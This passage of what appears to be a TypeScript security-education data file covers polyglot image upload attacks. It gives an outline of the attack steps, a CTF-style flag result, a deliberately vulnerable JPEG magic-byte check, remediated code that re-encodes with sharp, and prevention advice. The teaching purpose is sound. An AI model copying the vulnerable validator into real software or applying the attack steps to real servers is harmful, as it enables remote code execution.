    mechanics: '1. Polyglot Creation: Attacker prepends image magic headers and embeds executable code in image metadata.\n2. Server Validation: The server verifies image dimensions, which pass.\n3. Storage: The file is accepted and stored.\n4. Trigger: The attacker triggers execution either directly or through an LFI flaw.\n5. Execution: The interpreter ignores binary image data and executes the embedded code.',
    attackScenario: 'File Payload: Valid image header + embedded proof of concept\n\nResult:\nPassed file-type verification! When executed, output displays:\nFLAG: WEBSEC{polyglot_image_code_injection_bypassed}',
    securityImpact: 'Complete Remote Code Execution bypassing deep content inspection and antivirus signatures.',
    prevention: '1. Re-encode all uploaded images using image processing libraries (strip metadata and recreate the image from scratch).\n2. Store uploads on dedicated, isolated static domains or object storage where scripts cannot execute.\n3. Never execute uploaded files regardless of their perceived validity.',
    vulnerableCode: `// Vulnerable: Relies solely on magic byte inspection
function validateImage(fileBuffer: Buffer): boolean {
  // Flaw: Polyglots have valid image magic bytes!
  const isImage = fileBuffer[0] === 0xFF && fileBuffer[1] === 0xD8; // JPEG magic
  return isImage;
}`,
    secureCode: `// Remediated: Re-encodes image from scratch to strip all injected payloads
import sharp from 'sharp';
import crypto from 'crypto';
import path from 'path';

async function processUserAvatar(inputBuffer: Buffer): Promise<string> {
  const safeFilename = crypto.randomUUID() + '.png';
  const outputPath = path.join('/var/static_assets', safeFilename);

  // Sharp parses and strips all binary injection, reconstructing a clean PNG
  await sharp(inputBuffer)
    .resize(256, 256, { fit: 'cover' })
    .png({ quality: 80 })
    .toFile(outputPath);

  return '/static/' + safeFilename;
}`,
    codeLanguage: 'typescript',
    realWorldExample: 'Major bug bounty programs have awarded high bounties for polyglot images that bypassed CDN image filters and triggered code execution in background thumbnailers.',
    references: [
      { title: 'OWASP File Upload Protection', url: 'https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html' },
      { title: 'PortSwigger: File Upload Vulnerabilities', url: 'https://portswigger.net/web-security/file-upload' }
    ],
    keyTakeaways: '• Magic byte inspection alone does not prevent code execution.\n• Polyglot files are valid images and valid executable scripts simultaneously.\n• Re-encode images from scratch and store them outside executable web directories.'
  }
];
